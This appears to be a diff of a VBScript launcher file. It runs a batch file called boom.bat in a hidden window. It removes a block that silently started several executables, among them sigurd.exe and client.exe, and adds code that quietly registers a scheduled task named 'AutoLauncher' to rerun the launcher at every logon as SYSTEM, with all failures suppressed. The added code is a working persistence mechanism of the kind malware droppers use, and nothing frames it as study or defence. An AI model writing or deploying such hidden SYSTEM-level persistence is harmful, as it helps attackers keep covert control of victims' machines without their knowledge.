@@ -18,19 +18,38 @@ End If
 
 WshShell.Run "cmd.exe /c boom.bat", 0, True
 
-Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Wait 30 seconds for the system/internet to stabilize
-WScript.Sleep 30000 
 
-' Get the folder path
-strPath = fso.GetParentFolderName(WScript.ScriptFullName)
 
-' Run your files silently (0 = Hidden, False = Do not wait for app to exit)
-WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
-WshShell.Run """" & strPath & "\client.exe""", 0, False
-WshShell.Run """" & strPath & "\file3.exe""", 0, False
-WshShell.Run """" & strPath & "\file4.exe""", 0, False
-WshShell.Run """" & strPath & "\file5.exe""", 0, False
-WshShell.Run """" & strPath & "\file6.exe""", 0, False
+
+' Add this code at the end of your launcher.vbs file
+
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Get current directory and launcher path
+currentDir = objFSO.GetAbsolutePathName(".")
+launcherPath = currentDir & "\launcher.vbs"
+
+' Create scheduled task silently
+Set objExec = objShell.Exec("cmd.exe /c schtasks /create /tn ""AutoLauncher"" /tr """ & launcherPath & """ /sc onlogon /delay 00:30 /f /ru SYSTEM")
+
+' Wait for task creation to complete
+Do While objExec.Status = 0
+    WScript.Sleep 100
+Loop
+
+' Check if task was created successfully
+If objExec.ExitCode <> 0 Then
+    ' Failed silently - no message box
+    Set objExec = Nothing
+    Set objShell = Nothing
+    Set objFSO = Nothing
+    WScript.Quit
+End If
+
+' Success - clean up and exit silently
+Set objExec = Nothing
+Set objShell = Nothing
+Set objFSO = Nothing
+WScript.Quit
